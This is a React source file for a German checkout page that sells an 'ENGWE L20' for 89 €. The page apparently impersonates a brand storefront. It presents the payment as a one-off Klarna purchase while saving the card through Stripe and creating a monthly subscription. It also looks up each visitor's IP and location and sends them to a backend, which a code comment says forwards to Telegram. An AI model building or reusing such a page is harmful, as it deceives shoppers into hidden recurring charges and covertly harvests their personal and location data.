import React, { useState, useEffect, useMemo } from 'react';
import { loadStripe } from '@stripe/stripe-js';
import { Elements, PaymentElement, useStripe, useElements } from '@stripe/react-stripe-js';
import ThankYouPage from './ThankYouPage';
import './App.css';

const stripePromise = loadStripe('pk_live_51SlSfuH5RIgTG9jjKYiYbh5Pi5SPwWvPwEFtiY7whv2qkkWX7XUGvl6PaB20zqJHKjLgklTXJqhHzoaVf2iWu9bA00Gth1qV2D');
const BACKEND = 'https://pme.onrender.com';
const PRODUCT_IMAGE = 'https://assets.lightfunnels.com/account-86909/images_library/809c238c-762d-4aad-b65e-ea78e0e07903.jpg';

function generateVisitorId() {
  return 'V-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

const VISITOR_ID = generateVisitorId();

function fbTrack(event, params) {
  if (window.fbq) { window.fbq('track', event, params); }
  else { const i = setInterval(() => { if (window.fbq) { window.fbq('track', event, params); clearInterval(i); } }, 100); setTimeout(() => clearInterval(i), 5000); }
}

function PaymentForm({ customerId, visitorId }) {
  const stripe = useStripe();
  const elements = useElements();
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [ready, setReady] = useState(false);

  const handlePay = async () => {
    if (!stripe || !elements || !ready) return;
    setIsLoading(true);
    setMessage('');
    const { error } = await stripe.confirmSetup({
      elements,
      confirmParams: {
        return_url: `${window.location.origin}?customer_id=${customerId}&visitor_id=${visitorId}`,
      }
    });
    if (error) { setMessage(error.message); setIsLoading(false); }
  };

  return (
    <div>
      <div className="opt-box" style={{ marginBottom: 12 }}>
        <div className="opt-row sel">
          <div className="radio"><div className="radio-inner" /></div>
          <div className="opt-lbl">
            <div className="opt-name">Klarna</div>
            <div className="opt-sub">Jetzt kaufen, später bezahlen</div>
          </div>
          <span className="badge badge-klarna">Klarna</span>
        </div>
      </div>

      <div className="stripe-wrap">
        <PaymentElement onReady={() => setReady(true)} />
      </div>

      {message && <div className="err-banner show">{message}</div>}

      <button
        className="btn"
        onClick={handlePay}
        disabled={!stripe || isLoading || !ready}
        style={{ marginTop: 16 }}
      >
        {!ready ? (
          <><div className="spin spin-sm" /><span>Laden…</span></>
        ) : isLoading ? (
          <><div className="spin spin-sm" /><span>Verarbeitung…</span></>
        ) : (
          <>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            <span>Jetzt bezahlen</span>
          </>
        )}
      </button>
      <p className="pay-note">
        Mit Ihrer Bestellung stimmen Sie unseren <a href="/agb">AGB</a> und der <a href="/datenschutz">Datenschutzerklärung</a> zu.
      </p>
    </div>
  );
}

function ElementsWrapper({ clientSecret, customerId, visitorId }) {
  const options = useMemo(() => ({
    clientSecret,
    locale: 'de',
  }), [clientSecret]);

  return (
    <Elements stripe={stripePromise} options={options}>
      <PaymentForm customerId={customerId} visitorId={visitorId} />
    </Elements>
  );
}

function Field({ id, label, type = 'text', value, onChange, error, ...props }) {
  return (
    <div className={`field${error ? ' err' : ''}${value ? ' filled' : ''}`}>
      <input id={id} type={type} placeholder=" " value={value} onChange={onChange} {...props} />
      <label htmlFor={id}>{label}</label>
      {error && <div className="field-err">{error}</div>}
    </div>
  );
}

function SummaryContent() {
  return (
    <>
      <div className="prod-row">
        <div className="prod-img-wrap">
          <img src={PRODUCT_IMAGE} className="prod-img" alt="ENGWE L20" />
          <span className="qty-badge">1</span>
        </div>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center' }}>
          <div className="prod-name">ENGWE L20</div>
        </div>
        <div className="prod-price" style={{ alignSelf: 'center' }}>89,00 €</div>
      </div>
      <div className="disc-row">
        <input className="disc-in" placeholder="Rabattcode oder Gutschein" />
        <button className="disc-btn">Anwenden</button>
      </div>
      <div className="divider" />
      <div className="sum-row"><span className="sum-lbl">Zwischensumme</span><span>89,00 €</span></div>
      <div className="sum-row"><span className="sum-lbl">Versand</span><span className="sum-free">Kostenloser Versand</span></div>
      <div className="divider" />
      <div className="total-row">
        <span className="total-lbl">Gesamt</span>
        <div className="total-right"><span className="total-cur">EUR</span><span className="total-val">89,00 €</span></div>
      </div>
      <div className="trust-row">
        <div className="trust-item">
          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <span>SSL-Verschlüsselung</span>
        </div>
        <div className="trust-item">
          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          <span>Käuferschutz</span>
        </div>
        <div className="trust-item">
          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
          <span>Jederzeit kündigen</span>
        </div>
      </div>
    </>
  );
}

export default function App() {
  const [step, setStep] = useState(1);
  const [form, setForm] = useState({ email: '', fname: '', lname: '', address: '', zip: '', city: '', phone: '', country: 'DE' });
  const [errors, setErrors] = useState({});
  const [clientSecret, setClientSecret] = useState('');
  const [customerId, setCustomerId] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [orderComplete, setOrderComplete] = useState(false);
  const [orderNumber, setOrderNumber] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [mobSummaryOpen, setMobSummaryOpen] = useState(false);
  const [deliveryTab, setDeliveryTab] = useState('home');

  useEffect(() => {
    fbTrack('InitiateCheckout', { currency: 'EUR', value: 89.00, content_name: 'ENGWE L20', content_ids: ['engwe-l20-monthly'] });

    // Get visitor IP and country then send to Telegram
    fetch('https://ipapi.co/json/')
      .then(r => r.json())
      .then(geo => {
        fetch(`${BACKEND}/page-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            visitorId: VISITOR_ID,
            ip: geo.ip,
            country: geo.country_name,
            city: geo.city,
          })
        }).catch(() => {});
      })
      .catch(() => {
        fetch(`${BACKEND}/page-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ visitorId: VISITOR_ID })
        }).catch(() => {});
      });

    const p = new URLSearchParams(window.location.search);
    const sics = p.get('setup_intent_client_secret');
    const cid  = p.get('customer_id');
    const rs   = p.get('redirect_status');
    const vid  = p.get('visitor_id');
    if (sics && cid && rs === 'succeeded') {
      setIsProcessing(true);
      stripePromise.then(stripe => {
        stripe.retrieveSetupIntent(sics).then(({ setupIntent }) => {
          if (setupIntent.status === 'succeeded') {
            fetch(`${BACKEND}/create-subscription`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                customerId: cid,
                paymentMethodId: setupIntent.payment_method,
                visitorId: vid || VISITOR_ID
              })
            })
            .then(r => r.json())
            .then(data => {
              setOrderNumber(data.subscriptionId || '0000');
              setOrderComplete(true);
              fbTrack('Purchase', { currency: 'EUR', value: 89.00, content_name: 'ENGWE L20', content_ids: ['engwe-l20-monthly'] });
              setIsProcessing(false);
            })
            .catch(() => {
              setOrderNumber('0000');
              setOrderComplete(true);
              setIsProcessing(false);
            });
          }
        });
      });
    }
  }, []);

  const setField = key => e => setForm(f => ({ ...f, [key]: e.target.value }));
  const clearErr = key => setErrors(er => ({ ...er, [key]: '' }));

  const validate = () => {
    const e = {};
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Gib eine gültige E-Mail-Adresse ein';
    if (!form.fname.trim()) e.fname = 'Vorname ist erforderlich';
    if (!form.lname.trim()) e.lname = 'Nachname ist erforderlich';
    if (!form.address.trim()) e.address = 'Adresse ist erforderlich';
    if (!form.zip.trim()) e.zip = 'Postleitzahl ist erforderlich';
    if (!form.city.trim()) e.city = 'Stadt ist erforderlich';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleStep1 = async e => {
    e.preventDefault();
    if (!validate()) return;
    setIsLoading(true);
    fbTrack('InitiateCheckout', { currency: 'EUR', value: 89.00, content_name: 'ENGWE L20', content_ids: ['engwe-l20-monthly'] });
    try {
      const res = await fetch(`${BACKEND}/create-setup-intent`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: form.email,
          fname: form.fname,
          lname: form.lname,
          address: form.address,
          zip: form.zip,
          city: form.city,
          country: form.country,
          phone: form.phone,
          visitorId: VISITOR_ID,
        })
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setClientSecret(data.clientSecret);
      setCustomerId(data.customerId);
      setStep(2);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } catch (err) {
      alert('Fehler: ' + err.message);
    }
    setIsLoading(false);
  };

  if (isProcessing) return (
    <div className="processing-screen">
      <div className="spin" />
      <div className="proc-t">Zahlung wird verarbeitet…</div>
      <div className="proc-s">Bitte warten Sie einen Moment</div>
    </div>
  );

  if (orderComplete) return <ThankYouPage orderNumber={orderNumber} />;

  return (
    <div className="app">
      <header className="topbar">
        <a href="/" className="logo">ENGWE<em>L20</em></a>
        <div className="secure">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Sichere Zahlung
        </div>
      </header>

      <div className="mob-bar">
        <div className="mob-toggle" onClick={() => setMobSummaryOpen(o => !o)}>
          <div className="mob-toggle-left">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
            Bestellübersicht {mobSummaryOpen ? '▴' : '▾'}
          </div>
          <div className="mob-price">89,00 €</div>
        </div>
        {mobSummaryOpen && <div className="mob-body"><SummaryContent /></div>}
      </div>

      <div className="layout">
        <div className="left">
          <nav className="bc">
            <div className={`bc-step${step === 1 ? ' active' : ' done'}`}>
              <div className="bc-num">{step > 1 ? '✓' : '1'}</div>
              Kontakt &amp; Lieferung
            </div>
            <span className="bc-sep">›</span>
            <div className={`bc-step${step === 2 ? ' active' : ''}`}>
              <div className="bc-num">2</div>
              Zahlung
            </div>
          </nav>

          {step === 1 && (
            <form onSubmit={handleStep1} noValidate>
              <div className="sec">
                <div className="sec-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                  Kontakt
                </div>
                <Field id="email" label="E-Mail-Adresse" type="email" value={form.email} onChange={setField('email')} error={errors.email} onFocus={() => clearErr('email')} />
                <label className="chk"><input type="checkbox" /><span>Neuigkeiten und Angebote per E-Mail erhalten</span></label>
              </div>

              <div className="sec">
                <div className="sec-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="1" y="3" width="15" height="13"/><polygon points="16,8 20,8 23,11 23,16 16,16 16,8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
                  Lieferung
                </div>
                <div className="dtabs">
                  {['home', 'dhl'].map(t => (
                    <div key={t} className={`dtab${deliveryTab === t ? ' sel' : ''}`} onClick={() => setDeliveryTab(t)}>
                      <div className="radio"><div className="radio-inner" /></div>
                      <span className="dtab-label">{t === 'home' ? 'Nach Hause' : 'Mit Unterschrift'}</span>
                    </div>
                  ))}
                </div>
                <div className="field filled">
                  <select value={form.country} onChange={setField('country')}>
                    <option value="DE">Deutschland</option>
                    <option value="AT">Österreich</option>
                    <option value="CH">Schweiz</option>
                    <option value="FR">Frankreich</option>
                    <option value="NL">Niederlande</option>
                  </select>
                  <label>Land / Region</label>
                  <span className="arr">▾</span>
                </div>
                <div className="field-row">
                  <Field id="fname" label="Vorname" value={form.fname} onChange={setField('fname')} error={errors.fname} onFocus={() => clearErr('fname')} />
                  <Field id="lname" label="Nachname" value={form.lname} onChange={setField('lname')} error={errors.lname} onFocus={() => clearErr('lname')} />
                </div>
                <Field id="address" label="Adresse" value={form.address} onChange={setField('address')} error={errors.address} onFocus={() => clearErr('address')} />
                <div className="field-row">
                  <Field id="zip" label="Postleitzahl" value={form.zip} onChange={setField('zip')} error={errors.zip} onFocus={() => clearErr('zip')} />
                  <Field id="city" label="Stadt" value={form.city} onChange={setField('city')} error={errors.city} onFocus={() => clearErr('city')} />
                </div>
                <Field id="phone" label="Telefon (optional)" type="tel" value={form.phone} onChange={setField('phone')} />
                <label className="chk"><input type="checkbox" /><span>Meine Informationen für das nächste Mal speichern</span></label>
              </div>

              <div className="sec">
                <div className="sec-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
                  Versand
                </div>
                <div className="opt-box">
                  <div className="opt-row sel">
                    <div className="radio"><div className="radio-inner" /></div>
                    <div className="opt-lbl"><div className="opt-name">DHL Paket</div><div className="opt-sub">1–3 Werktage</div></div>
                    <span className="badge badge-free">KOSTENLOS</span>
                  </div>
                </div>
              </div>

              <button type="submit" className="btn" disabled={isLoading}>
                {isLoading
                  ? <><div className="spin spin-sm" /><span>Laden…</span></>
                  : <><span>Weiter zur Zahlung</span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></>
                }
              </button>
            </form>
          )}

          {step === 2 && (
            <div>
              <div className="s2sum">
                <div className="s2row">
                  <span className="s2lbl">Kontakt</span>
                  <span className="s2val">{form.email}</span>
                  <span className="s2edit" onClick={() => setStep(1)}>Ändern</span>
                </div>
                <div className="s2row">
                  <span className="s2lbl">Lieferung</span>
                  <span className="s2val">{form.address}, {form.zip} {form.city}</span>
                  <span className="s2edit" onClick={() => setStep(1)}>Ändern</span>
                </div>
              </div>
              <div className="sec">
                <div className="sec-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                  Zahlung
                </div>
                <p className="pay-subtitle">Alle Transaktionen sind sicher und verschlüsselt.</p>
                <ElementsWrapper clientSecret={clientSecret} customerId={customerId} visitorId={VISITOR_ID} />
              </div>
            </div>
          )}

          <nav className="footer">
            {['Widerrufsrecht','Versand','Datenschutzerklärung','AGB','Impressum','Kontakt'].map(l =>
              <a key={l} href={`/${l.toLowerCase()}`} className="footer-link">{l}</a>
            )}
          </nav>
        </div>

        <div className="right"><SummaryContent /></div>
      </div>
    </div>
  );
}
